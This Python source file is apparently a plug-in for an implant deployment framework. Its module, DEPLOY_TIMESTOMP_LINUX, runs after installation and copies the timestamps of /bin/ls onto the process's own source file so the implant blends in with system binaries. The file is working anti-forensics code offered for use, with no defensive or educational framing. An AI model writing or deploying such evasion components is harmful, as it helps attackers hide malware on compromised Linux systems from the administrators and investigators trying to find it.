# Labels
__RESOURCE_TYPE__ = "DYNAMIC"
__PLATFORM_COMPATIBILITY__ = ["GNU/LINUX"]
__ARCHITECTURE_COMPATIBILITY__ = ["ALL"]
__SELECTABLE__ = True

# Library import
from ... import InstallationModule
import os
import __main__
import traceback
import shutil
from typing import Optional

# Classes definition
class DeployModule(InstallationModule):
    # Class properties definition
    MODULE_NAME = "DEPLOY_TIMESTOMP_LINUX"
    INSTALL_STAGE = InstallationModule.INSTALL_STAGE_POSTINSTALL
    COMPATIBILITY = (InstallationModule.PLATFORM_GNU_LINUX, )

    def __init__(self,
        container,
        system
    ) -> None:
        # Constructor hereditance
        super().__init__(container, system)

        # Instance properties definition
        self.target_path: Optional[str] = system.virtual_file_system.query("PROCESS_SOURCE_FILEPATH")
        self.reference_resource: str = "/bin/ls"
    

    def start(self) -> bool:
        print(f"[{self.MODULE_NAME}] Starting module...")

        try:
            resource_status = os.stat(self.reference_resource)
            os.utime(
                self.target_path,
                (resource_status.st_atime, resource_status.st_mtime)
            )
            print(f"[{self.MODULE_NAME}] Timestamp copied from {self.reference_resource} to {self.target_path}")
            return True
        except:
            print(f"[{self.MODULE_NAME}] Failed to perform timestomping")
            traceback.print_exc()
            return False
    
    def stop(self) -> bool:
        pass

    def configure(self, configurations) -> bool:
        pass